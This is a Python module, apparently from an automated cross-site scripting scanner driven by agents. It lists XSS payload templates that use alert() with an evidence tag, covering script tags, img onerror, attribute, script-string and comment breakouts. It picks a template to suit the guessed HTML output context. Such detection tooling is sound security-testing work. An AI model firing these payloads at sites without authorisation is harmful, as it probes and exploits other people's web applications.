"""Payload shapes for first-order delivery.

The trigger agent learns the sink context from ``verify_tag``; the direct agent
needs payload shapes that fit that context. Shapes stay declarative and are
selected by ``context_kind``, so the same table serves both agents and the
report can show exactly which shape was used.
"""

from __future__ import annotations

import re

#: Contexts where the reflection is inert markup (script tags execute).
_INLINE_HTML = ("html_text", "plain_text", "textarea", "json", "comment")

#: Shape name -> template; ``{tag}`` is the 4-char evidence marker.
SHAPES: dict[str, str] = {
    "tag": "{tag}",
    "script_tag": "<script>alert('{tag}')</script>",
    "img_onerror": '<img src=x onerror=alert("{tag}")>',
    "attr_breakout": '"><script>alert(\'{tag}\')</script>',
    "attr_event": '\'><img src=x onerror=alert("{tag}")>',
    "script_string": "';alert('{tag}');//",
    "script_block": "alert('{tag}');//",
    "comment_breakout": "--> <script>alert('{tag}')</script>",
}

_BY_CONTEXT: dict[str, tuple[str, ...]] = {
    "html_text": ("script_tag", "img_onerror"),
    "plain_text": ("script_tag", "img_onerror"),
    "textarea": ("script_tag",),
    "comment": ("comment_breakout", "script_tag"),
    "attr": ("attr_breakout", "attr_event", "img_onerror"),
    "script_string": ("script_string", "script_block"),
    "script_block": ("script_block", "script_string"),
    "json": ("script_tag", "img_onerror"),
}


def shapes_for(context_kind: str | None) -> list[str]:
    """Shape names to try for a context, in order."""
    return list(_BY_CONTEXT.get(str(context_kind or ""), ("script_tag", "img_onerror", "attr_breakout")))


def render(shape: str, tag: str) -> str:
    """Fill the tag marker into a shape template."""
    return SHAPES.get(shape, "{tag}").format(tag=tag)


def is_inline_html(context_kind: str | None) -> bool:
    return str(context_kind or "") in _INLINE_HTML


_ATTR_SINK = re.compile(r"""(?:value|src|href)\s*=\s*["']""", re.IGNORECASE)


def infer_sink_context(sink_code: str) -> str:
    """Best static guess of the output context from the sink expression.

    The trigger agent refines this with ``verify_tag`` after the first write;
    this guess only orders the payload candidates.
    """
    code = sink_code or ""
    if "<!--" in code or "-->" in code:
        return "comment"
    if _ATTR_SINK.search(code):
        return "attr"
    lowered = code.lower()
    if "<script" in lowered or '"<script' in lowered or "'<script" in lowered:
        return "script_block"
    if "json_encode" in lowered:
        return "json"
    return "html_text"
